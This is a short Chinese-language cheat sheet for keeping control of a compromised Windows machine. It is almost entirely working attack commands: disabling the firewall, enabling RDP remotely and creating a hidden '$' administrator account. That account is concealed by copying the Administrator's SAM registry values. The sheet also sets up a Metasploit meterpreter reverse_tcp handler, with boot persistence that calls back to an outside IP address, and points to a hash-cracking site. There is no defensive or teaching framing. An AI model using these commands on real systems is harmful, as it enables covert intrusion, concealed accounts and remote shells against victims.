##关闭防火墙

```
netsh firewall set opmode disable
或者
netsh advfilewall set publicprofile state off
```

##开启RDP服务
###Windows 7 or 2008

```
1.
net start "Windows Management Instrumentation"
2.
C:\Windows\System32\wbem\wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != "") call setallowtsconnections 1
3.
C:\Windows\System32\wbem\wmic  /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1
4.
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
5.
net start TermService
```

###Windows XP or 2003

```
wmic
(C:\Windows\System32\wbem\wmic)
path win32_terminalservicesetting where (__CLASS != "")
call setallowtsconnections 1
```

##添加隐藏用户(WIN7)

```
net user e$ 123456 /add
net localgroup administrators e$ /add
net localgroup "Remote Desktop Users" e$ /add
(用户名有“$”，执行`net user`时不会显示)
```

打开注册表regedit  
转到  
`HKEY_LOCAL_MACHINE\SAM\SAM`  
右键"权限"，`administrators`组添加完全控制权限  
转到  
`HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names`  
找到添加的隐藏用户一项，类型诸如`0x3ed`，administrator为`0x1f4`。将users中隐藏用户的一项`000003ED`导出为`hs$.reg`。  
将管理员账户的`000001F4`中的F值复制到`000003ED`中的F值，确定保存。  
命令行输入`net user hs$ /del`删除添加的用户，双击刚才导出的文件`hs$.reg`导入注册表。

## backdoor

`msf > use exploit/multi/handler`

`msf exploit(handler) > set lhost 104.128.87.194`

`msf exploit(handler) > set lport 5555`

`msf exploit(handler) > set payload windows/x64/meterpreter/reverse_tcp`

`msf exploit(handler) > run`

...

`meterpreter > run persistence -X -i 60 -P windows/x64/meterpreter/reverse_tcp -p 5555 -r 104.128.87.194`

> `-X` 开机启动
> 
> `-i` 回连时间间隔(秒)
> 
> `-P` payload
> 
> `-p` 回连端口
> 
> `-r` 回连地址



##Windows Hash网站
`http://www.objectif-securite.ch/ophcrack.ph